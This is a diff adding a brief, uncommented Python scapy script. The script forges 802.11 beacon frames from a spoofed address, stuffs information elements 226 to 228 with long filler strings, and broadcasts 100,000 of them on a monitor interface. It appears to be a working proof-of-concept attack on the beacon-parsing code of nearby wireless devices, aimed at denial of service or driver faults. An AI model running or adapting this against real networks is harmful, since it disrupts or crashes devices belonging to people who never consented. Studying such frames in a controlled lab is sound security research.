@@ -1,0 +1,5 @@
+#!/usr/bin/python
+import sys
+from scapy.all import *
+pkt=RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2="aa:aa:aa:aa:aa:aa",addr3="aa:aa:aa:aa:aa:aa")/Dot11Beacon()/Dot11Elt(ID=226,info="demodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemo")/Dot11Elt(ID=227,info="demodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemo")/Dot11Elt(ID=228,info="demodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemodemo")
+sendp(pkt, iface="wlan0mon", count=100000)
